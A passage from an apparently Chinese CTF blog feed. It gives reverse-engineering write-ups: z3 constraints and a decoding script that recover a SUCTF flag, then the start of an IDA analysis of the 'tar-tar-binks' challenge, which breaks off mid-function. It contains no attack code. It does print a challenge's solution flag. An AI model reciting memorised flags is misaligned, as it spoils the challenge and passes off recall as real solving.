class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x27</span>] == (((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) +</span><br><span class="line">                                         c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>] + c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) - c[</span><br><span class="line">                                      <span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>] + c[<span class="hljs-number">0x15</span>] + c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>] +</span><br><span class="line">                               c[<span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>] + c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>] + c[<span class="hljs-number">0x20</span>] + c[</span><br><span class="line">                                 <span class="hljs-number">0x21</span>] + c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) + c[<span class="hljs-number">0x25</span>] + c[<span class="hljs-number">0x26</span>] + c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) + c[</span><br><span class="line">               <span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x28</span>] == ((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) + c[<span class="hljs-number">4</span>] + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) + c[<span class="hljs-number">8</span>] + c[</span><br><span class="line">    <span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>] + c[<span class="hljs-number">0x10</span>] + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>] + c[</span><br><span class="line">                                       <span class="hljs-number">0x15</span>] + c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[<span class="hljs-number">0x1b</span>] + c[</span><br><span class="line">                                   <span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>] + c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>] + c[</span><br><span class="line">                              <span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>] + c[<span class="hljs-number">0x27</span>] + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x29</span>] == (((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>] + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) -</span><br><span class="line">                                                    c[<span class="hljs-number">9</span>]) + c[<span class="hljs-number">10</span>] + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) - c[</span><br><span class="line">                                                  <span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) + c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[</span><br><span class="line">                                            <span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) + c[<span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>] + c[<span class="hljs-number">0x1c</span>]) - c[</span><br><span class="line">                                        <span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[</span><br><span class="line">                                 <span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) + c[<span class="hljs-number">0x29</span>])</span><br></pre></td></tr></tbody></table></figure><p>这一部分可以直接用脚本来写，把所有的<code>param_1</code>替换并且注意把<code>（uint)</code>和<code>*param_1</code>特殊处理一下就好了</p><p>然后解出为唯一解</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> solver.check() == sat:</span><br><span class="line">    r = solver.model()</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):</span><br><span class="line">        flag.append(r[c[i]].as_long() ^ i)</span><br><span class="line"></span><br><span class="line">    flag = <span class="hljs-string">''</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">chr</span>(((x &gt;&gt; <span class="hljs-number">3</span>) | (x &lt;&lt; <span class="hljs-number">5</span>)) &amp; <span class="hljs-number">0xff</span>), flag))</span><br><span class="line">    <span class="hljs-built_in">print</span> flag</span><br></pre></td></tr></tbody></table></figure><p>直接输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">SUCTF</span>{Un<span class="hljs-number">1</span>c<span class="hljs-number">0</span>rn_Engin<span class="hljs-number">3</span>_Is_@_P<span class="hljs-number">0</span>wer<span class="hljs-number">7</span>ul_TO<span class="hljs-number">0</span>ls!}</span><br></pre></td></tr></tbody></table></figure><p><code>unicorn</code>和<code>z3</code>实在是太好用了，之前<code>b01lersCTF</code>的第一道题我还愚蠢的手解方程，早知道<code>z3</code>一把梭就完了……</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> unicorn </tag>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tar-tar-binks-攻防世界</title>
      <link href="/2020/03/25/tar-tar-binks-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2020/03/25/tar-tar-binks-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>tar-tar-binks-攻防世界</p><span id="more"></span><p>IDA打开发现函数很多，发现一个函数<code>base64_encode</code>，尝试对损坏的tar文件里面的部分进行base64解码，找到一串奇怪的字符</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">F5D1</span>,<span class="hljs-number">4</span>D<span class="hljs-number">6</span>B,ED<span class="hljs-number">6</span>A,<span class="hljs-number">08</span>A<span class="hljs-number">6</span>,<span class="hljs-number">38</span>DD,F<span class="hljs-number">7</span>FA,<span class="hljs-number">609</span>E,EBC<span class="hljs-number">4</span>,E<span class="hljs-number">55</span>F,E<span class="hljs-number">6</span>D<span class="hljs-number">1</span>,<span class="hljs-number">7</span>C<span class="hljs-number">89</span>,ED<span class="hljs-number">5</span>B,<span class="hljs-number">0871</span>,<span class="hljs-number">1</span>A<span class="hljs-number">69</span>,<span class="hljs-number">5</span>D<span class="hljs-number">58</span>,<span class="hljs-number">72</span>DE,<span class="hljs-number">224</span>B,<span class="hljs-number">3</span>AA<span class="hljs-number">6</span>,<span class="hljs-number">0845</span>,<span class="hljs-number">7</span>DD<span class="hljs-number">6</span>,<span class="hljs-number">58</span>FB,E<span class="hljs-number">9</span>CC,<span class="hljs-number">0</span>A<span class="hljs-number">2</span>D,<span class="hljs-number">76</span>B<span class="hljs-number">8</span>,ED<span class="hljs-number">60</span>,<span class="hljs-number">251</span>A,<span class="hljs-number">1</span>F<span class="hljs-number">6</span>B,<span class="hljs-number">32</span>CC,E<span class="hljs-number">78</span>D,<span class="hljs-number">12</span>FA,<span class="hljs-number">201</span>A,E<span class="hljs-number">889</span>,<span class="hljs-number">2</span>D<span class="hljs-number">25</span>,<span class="hljs-number">922</span>A,<span class="hljs-number">4</span>BC<span class="hljs-number">5</span>,F<span class="hljs-number">5</span>FF,F<span class="hljs-number">8</span>E<span class="hljs-number">5</span>,C<span class="hljs-number">79</span>B,<span class="hljs-number">3</span>A<span class="hljs-number">77</span>,<span class="hljs-number">4</span>BDB,EA<span class="hljs-number">11</span>,<span class="hljs-number">5941</span>,<span class="hljs-number">58</span>BD,<span class="hljs-number">3</span>A<span class="hljs-number">95</span>,F<span class="hljs-number">5</span>C<span class="hljs-number">9</span>,A<span class="hljs-number">225</span>,AD<span class="hljs-number">40</span>,F<span class="hljs-number">8</span>BD,<span class="hljs-number">095</span>D,<span class="hljs-number">70</span>B<span class="hljs-number">6</span>,<span class="hljs-number">458</span>C,E<span class="hljs-number">7</span>A<span class="hljs-number">9</span>,EA<span class="hljs-number">68</span>,<span class="hljs-number">252</span>F,<span class="hljs-number">094</span>B,<span class="hljs-number">5</span>E<span class="hljs-number">41</span>,<span class="hljs-number">0969</span>,<span class="hljs-number">6015</span>,<span class="hljs-number">5</span>ED<span class="hljs-number">5</span>,F<span class="hljs-number">6</span>E<span class="hljs-number">5</span>,<span class="hljs-number">59</span>B<span class="hljs-number">9</span>,<span class="hljs-number">7</span>CAF,<span class="hljs-number">66</span>DF,<span class="hljs-number">265</span>B,<span class="hljs-number">7837</span>,<span class="hljs-number">57</span>B<span class="hljs-number">4</span>,<span class="hljs-number">7</span>CAF,AED<span class="hljs-number">9</span>,F<span class="hljs-number">707</span>,<span class="hljs-number">6</span>A<span class="hljs-number">3</span>C,F<span class="hljs-number">8</span>E<span class="hljs-number">5</span>,F<span class="hljs-number">509</span>,<span class="hljs-number">7</span>C<span class="hljs-number">8</span>B,<span class="hljs-number">0915</span>,<span class="hljs-number">2235</span>,<span class="hljs-number">336</span>F,<span class="hljs-number">33</span>E<span class="hljs-number">9</span>,<span class="hljs-number">2</span>D<span class="hljs-number">14</span>,<span class="hljs-number">7</span>C<span class="hljs-number">91</span>,<span class="hljs-number">5804</span>,<span class="hljs-number">83</span>E<span class="hljs-number">5</span>,E<span class="hljs-number">78</span>D,F<span class="hljs-number">4</span>EA,<span class="hljs-number">0874</span>,ED<span class="hljs-number">6</span>B,<span class="hljs-number">4</span>B<span class="hljs-number">35</span>,E<span class="hljs-number">839</span>,<span class="hljs-number">57</span>B<span class="hljs-number">4</span>,E<span class="hljs-number">77</span>C,EA<span class="hljs-number">68</span>,<span class="hljs-number">2525</span>,AD<span class="hljs-number">41</span>,ED<span class="hljs-number">6</span>F,<span class="hljs-number">3</span>A<span class="hljs-number">4</span>A,<span class="hljs-number">4</span>BCC,<span class="hljs-number">6015</span>,F<span class="hljs-number">440</span>,<span class="hljs-number">0858</span>,<span class="hljs-number">3</span>AA<span class="hljs-number">6</span>,<span class="hljs-number">7809</span>,<span class="hljs-number">671</span>D,<span class="hljs-number">0874</span>,EA<span class="hljs-number">77</span>,<span class="hljs-number">63</span>AF,<span class="hljs-number">2</span>E<span class="hljs-number">91</span>,<span class="hljs-number">5845</span>,F<span class="hljs-number">6</span>C<span class="hljs-number">4</span>,<span class="hljs-number">086</span>D,<span class="hljs-number">7795</span>,<span class="hljs-number">3939</span>,<span class="hljs-number">57</span>B<span class="hljs-number">4</span>,<span class="hljs-number">7</span>C<span class="hljs-number">89</span>,<span class="hljs-number">82</span>DC,<span class="hljs-number">32</span>ED,B<span class="hljs-number">994</span>,C<span class="hljs-number">7</span>AF,<span class="hljs-number">9135</span>,<span class="hljs-number">0</span>E<span class="hljs-number">65</span>,<span class="hljs-number">1</span>B<span class="hljs-number">66</span>,ED<span class="hljs-number">5</span>B,<span class="hljs-number">3235</span>,<span class="hljs-number">6577</span>,<span class="hljs-number">5</span>A<span class="hljs-number">80</span>,<span class="hljs-number">3</span>AD<span class="hljs-number">3</span>,E<span class="hljs-number">776</span>,<span class="hljs-number">1</span>EE<span class="hljs-number">5</span>,AD<span class="hljs-number">41</span>,ED<span class="hljs-number">59</span>,<span class="hljs-number">864</span>C,<span class="hljs-number">70</span>B<span class="hljs-number">4</span>,<span class="hljs-number">3876</span>,ED<span class="hljs-number">67</span>,<span class="hljs-number">64</span>D<span class="hljs-number">6</span>,F<span class="hljs-number">8</span>E<span class="hljs-number">5</span>,F<span class="hljs-number">505</span>,EAD<span class="hljs-number">9</span>,<span class="hljs-number">7</span>C<span class="hljs-number">9</span>C,<span class="hljs-number">32</span>ED,B<span class="hljs-number">994</span>,B<span class="hljs-number">4</span>EF,<span class="hljs-number">0</span>C<span class="hljs-number">6</span>C,F<span class="hljs-number">665</span>,F<span class="hljs-number">5</span>F<span class="hljs-number">5</span>,<span class="hljs-number">9047</span>,<span class="hljs-number">521</span>A,E<span class="hljs-number">99</span>E,EA<span class="hljs-number">68</span>,<span class="hljs-number">252</span>F,<span class="hljs-number">9</span>D<span class="hljs-number">09</span>,<span class="hljs-number">76</span>B<span class="hljs-number">7</span>,E<span class="hljs-number">776</span>,<span class="hljs-number">1</span>ED<span class="hljs-number">0</span>,<span class="hljs-number">095</span>D,<span class="hljs-number">0</span>D<span class="hljs-number">4</span>D,<span class="hljs-number">5</span>D<span class="hljs-number">5</span>A,<span class="hljs-number">087</span>B,<span class="hljs-number">2005</span>,<span class="hljs-number">1526</span>,<span class="hljs-number">7</span>E<span class="hljs-number">76</span>,<span class="hljs-number">85</span>AD,<span class="hljs-number">78</span>B<span class="hljs-number">9</span>,E<span class="hljs-number">8</span>B<span class="hljs-number">6</span>,<span class="hljs-number">782</span>C,<span class="hljs-number">251</span>C,<span class="hljs-number">32</span>ED,<span class="hljs-number">7</span>F<span class="hljs-number">68</span>,EBE<span class="hljs-number">3</span>,EA<span class="hljs-number">41</span>,<span class="hljs-number">57</span>FD,ED<span class="hljs-number">59</span>,<span class="hljs-number">846</span>D,<span class="hljs-number">7</span>A<span class="hljs-number">05</span>,B<span class="hljs-number">994</span>,BB<span class="hljs-number">78</span>,ED<span class="hljs-number">6</span>A,<span class="hljs-number">08</span>A<span class="hljs-number">6</span>,<span class="hljs-number">38</span>DD,<span class="hljs-number">3</span>B<span class="hljs-number">5</span>D,<span class="hljs-number">7</span>E<span class="hljs-number">45</span>,E<span class="hljs-number">839</span>,<span class="hljs-number">738</span>C,E<span class="hljs-number">9</span>CC,<span class="hljs-number">0</span>A<span class="hljs-number">2</span>D,<span class="hljs-number">764</span>A,<span class="hljs-number">609</span>E,E<span class="hljs-number">8</span>B<span class="hljs-number">6</span>,EA<span class="hljs-number">68</span>,<span class="hljs-number">2524</span>,E<span class="hljs-number">6</span>BB,<span class="hljs-number">7</span>C<span class="hljs-number">9</span>C,<span class="hljs-number">639</span>F,<span class="hljs-number">3</span>A<span class="hljs-number">95</span>,<span class="hljs-number">0895</span>,F<span class="hljs-number">40</span>F,<span class="hljs-number">8328</span>,EA<span class="hljs-number">69</span>,<span class="hljs-number">7</span>EE<span class="hljs-number">5</span>,F<span class="hljs-number">8</span>BD,<span class="hljs-number">7</span>F<span class="hljs-number">7</span>D,<span class="hljs-number">0</span>D<span class="hljs-number">6</span>D,<span class="hljs-number">70</span>B<span class="hljs-number">6</span>,<span class="hljs-number">458</span>C,E<span class="hljs-number">8</span>B<span class="hljs-number">6</span>,EA<span class="hljs-number">68</span>,<span class="hljs-number">251</span>C,<span class="hljs-number">6065</span>,B<span class="hljs-number">35</span>F,C<span class="hljs-number">789</span>,<span class="hljs-number">5845</span>,<span class="hljs-number">7</span>F<span class="hljs-number">7</span>D,<span class="hljs-number">6</span>D<span class="hljs-number">89</span>,<span class="hljs-number">4</span>C<span class="hljs-number">6</span>E,A<span class="hljs-number">20</span>E,<span class="hljs-number">60</span>B<span class="hljs-number">5</span>,<span class="hljs-number">7</span>E<span class="hljs-number">45</span>,ED<span class="hljs-number">59</span>,F<span class="hljs-number">707</span>,<span class="hljs-number">69</span>EF,<span class="hljs-number">922</span>A,<span class="hljs-number">4</span>BC<span class="hljs-number">5</span>,F<span class="hljs-number">6</span>EF,<span class="hljs-number">8635</span>,F<span class="hljs-number">4</span>B<span class="hljs-number">9</span>,<span class="hljs-number">57</span>B<span class="hljs-number">4</span>,<span class="hljs-number">7</span>CF<span class="hljs-number">8</span>,ED<span class="hljs-number">60</span>,<span class="hljs-number">2510</span>,<span class="hljs-number">095</span>D,<span class="hljs-number">20</span>AF,<span class="hljs-number">3545</span>,F<span class="hljs-number">40</span>F,<span class="hljs-number">8328</span>,EA<span class="hljs-number">41</span>,<span class="hljs-number">58</span>A<span class="hljs-number">4</span>,<span class="hljs-number">225</span>D,<span class="hljs-number">7</span>E<span class="hljs-number">7</span>C,<span class="hljs-number">4</span>BDB,F<span class="hljs-number">8</span>BD,<span class="hljs-number">082</span>C,EAE<span class="hljs-number">7</span>,<span class="hljs-number">5</span>D<span class="hljs-number">57</span>,<span class="hljs-number">5</span>D<span class="hljs-number">50</span>,<span class="hljs-number">0914</span>,E<span class="hljs-number">7</span>C<span class="hljs-number">7</span>,<span class="hljs-number">8624</span>,<span class="hljs-number">7</span>CF<span class="hljs-number">8</span>,ED<span class="hljs-number">60</span>,<span class="hljs-number">2511</span>,<span class="hljs-number">7</span>C<span class="hljs-number">8</span>E,<span class="hljs-number">7159</span>,<span class="hljs-number">8416</span>,<span class="hljs-number">7</span>EF<span class="hljs-number">9</span>,E<span class="hljs-number">7</span>E<span class="hljs-number">5</span>,<span class="hljs-number">774</span>A,<span class="hljs-number">3895</span>,<span class="hljs-number">1</span>EC<span class="hljs-number">9</span>,<span class="hljs-number">7</span>C<span class="hljs-number">90</span>,<span class="hljs-number">09</span>B<span class="hljs-number">9</span>,<span class="hljs-number">58</span>BD,<span class="hljs-number">5</span>FF<span class="hljs-number">5</span>,E<span class="hljs-number">99</span>E,EA<span class="hljs-number">68</span>,<span class="hljs-number">250</span>A,<span class="hljs-number">224</span>C,EA<span class="hljs-number">3</span>D,<span class="hljs-number">73</span>F<span class="hljs-number">5</span>,<span class="hljs-number">7</span>C<span class="hljs-number">89</span>,<span class="hljs-number">53</span>A<span class="hljs-number">6</span>,<span class="hljs-number">3190</span>,<span class="hljs-number">3</span>B<span class="hljs-number">5</span>D,<span class="hljs-number">1526</span>,<span class="hljs-number">7</span>DD<span class="hljs-number">5</span>,<span class="hljs-number">666</span>A,<span class="hljs-number">0919</span>,<span class="hljs-number">225</span>F,CDEF,<span class="hljs-number">79</span>E<span class="hljs-number">1</span>,<span class="hljs-number">7</span>E<span class="hljs-number">7</span>B,<span class="hljs-number">7</span>E<span class="hljs-number">6</span>B,<span class="hljs-number">082</span>C,A<span class="hljs-number">277</span>,E<span class="hljs-number">885</span>,E<span class="hljs-number">8</span>BB,E<span class="hljs-number">775</span>,<span class="hljs-number">5</span>FF<span class="hljs-number">7</span>,EA<span class="hljs-number">68</span>,<span class="hljs-number">251</span>B,<span class="hljs-number">7</span>FDF,<span class="hljs-number">589</span>D,<span class="hljs-number">7</span>A<span class="hljs-number">05</span>,<span class="hljs-number">779</span>A,<span class="hljs-number">8</span>A<span class="hljs-number">5</span>A,<span class="hljs-number">7</span>C<span class="hljs-number">91</span>,<span class="hljs-number">5</span>D<span class="hljs-number">5</span>C,<span class="hljs-number">32</span>ED,F<span class="hljs-number">628</span>,<span class="hljs-number">2195</span>,F<span class="hljs-number">49</span>A,<span class="hljs-number">0</span>C<span class="hljs-number">77</span>,EAE<span class="hljs-number">1</span>,<span class="hljs-number">59</span>B<span class="hljs-number">9</span>,<span class="hljs-number">58</span>BD,E<span class="hljs-number">570</span>,E<span class="hljs-number">99</span>E,EA<span class="hljs-number">3</span>D,<span class="hljs-number">73</span>F<span class="hljs-number">9</span>,<span class="hljs-number">13</span>AD,<span class="hljs-number">2</span>BF<span class="hljs-number">5</span>,<span class="hljs-number">225</span>D,<span class="hljs-number">7</span>F<span class="hljs-number">7</span>D,<span class="hljs-number">70</span>B<span class="hljs-number">6</span>,<span class="hljs-number">4</span>A<span class="hljs-number">9</span>C,<span class="hljs-number">337</span>A,<span class="hljs-number">1</span>EC<span class="hljs-number">9</span>,<span class="hljs-number">4</span>D<span class="hljs-number">05</span>,<span class="hljs-number">7</span>E<span class="hljs-number">75</span>,<span class="hljs-number">2578</span>,ED<span class="hljs-number">59</span>,<span class="hljs-number">38</span>E<span class="hljs-number">5</span>,<span class="hljs-number">1</span>ECA,A<span class="hljs-number">210</span>,<span class="hljs-number">3</span>B<span class="hljs-number">5</span>D,<span class="hljs-number">779</span>A,<span class="hljs-number">8</span>A<span class="hljs-number">6</span>F,C<span class="hljs-number">790</span>,<span class="hljs-number">2518</span>,<span class="hljs-number">4</span>B<span class="hljs-number">41</span>,<span class="hljs-number">7</span>C<span class="hljs-number">89</span>,<span class="hljs-number">5</span>D<span class="hljs-number">49</span>,<span class="hljs-number">4</span>D<span class="hljs-number">05</span>,<span class="hljs-number">152</span>D,<span class="hljs-number">73</span>C<span class="hljs-number">5</span>,<span class="hljs-number">79</span>F<span class="hljs-number">9</span>,<span class="hljs-number">4</span>BED,<span class="hljs-number">913</span>C,<span class="hljs-number">37</span>C<span class="hljs-number">9</span>,<span class="hljs-number">5</span>D<span class="hljs-number">4</span>D,<span class="hljs-number">53</span>C<span class="hljs-number">8</span>,<span class="hljs-number">0941</span>,<span class="hljs-number">7</span>C<span class="hljs-number">97</span>,<span class="hljs-number">5</span>D<span class="hljs-number">5</span>B,<span class="hljs-number">346</span>A,<span class="hljs-number">82</span>D<span class="hljs-number">8</span>,<span class="hljs-number">5</span>F<span class="hljs-number">36</span>,<span class="hljs-number">801</span>F,C<span class="hljs-number">800</span>,</span><br></pre></td></tr></tbody></table></figure><p>最后的一个<code>,</code>很可疑，应该是输出的时候按照固定格式输出的，所以搜索一下字符串</p><p><img src="https://s1.ax1x.com/2020/03/25/8jEkqS.png" alt="tar-tar-binks"></p><p>找到可疑的<code>%04X</code>，查一下交叉引用</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v10 = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2710</span>uLL);</span><br><span class="line"> __memcpy_chk(v10, a2, v18, <span class="hljs-number">-1LL</span>);</span><br><span class="line"> <span class="hljs-keyword">if</span> ( v18 &gt; <span class="hljs-number">0x200</span> )</span><br><span class="line"> {</span><br><span class="line">   <span class="hljs-built_in">sub_1023457</span>(v10, v18);</span><br><span class="line">   v9 = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2710</span>uLL);</span><br><span class="line">   __memset_chk(v10, <span class="hljs-number">0LL</span>, <span class="hljs-number">10000LL</span>, <span class="hljs-number">-1LL</span>);</span><br><span class="line">   v8 = <span class="hljs-number">0</span>;</span><br><span class="line">   __memset_chk(v9, <span class="hljs-number">0LL</span>, <span class="hljs-number">10000LL</span>, <span class="hljs-number">-1LL</span>);</span><br><span class="line">   <span class="hljs-keyword">while</span> ( v8 &lt; posi )</span><br><span class="line">   {</span><br><span class="line">     v3 = <span class="hljs-built_in">strlen</span>(v9);</span><br><span class="line">     __sprintf_chk(&amp;v9[v3], <span class="hljs-number">0</span>, <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>LL, <span class="hljs-string">"%04X,"</span>, sub_101[v8++]);</span><br><span class="line">   }</span><br><span class="line">   __memcpy_chk(v10, v9, v18, <span class="hljs-number">-1LL</span>);</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>只有在这一处引用了，输出出来的奇怪的16进制数应该是<code>sub_101</code>里面的数，再查看一下<code>sub_101</code>的交叉引用</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *__fastcall <span class="hljs-title">sub_1023458</span><span class="hljs-params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *result; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// ST04_4</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// esi</span></span><br><span class="line"></span><br><span class="line">  result = sub_101;</span><br><span class="line">  v2 = *a1 + <span class="hljs-number">40</span> * a1[<span class="hljs-number">1</span>] + <span class="hljs-number">1600</span> * a1[<span class="hljs-number">2</span>];</span><br><span class="line">  v3 = posi++;</span><br><span class="line">  sub_101[v3] = v2;</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在这里进行了计算并写入，再一次查看交叉引用看看<code>a1</code>是什么</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_1023457</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *a1, <span class="hljs-keyword">int</span> a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *v8; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v8 = a1;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v6 = <span class="hljs-number">3</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v2 = v7--;</span><br><span 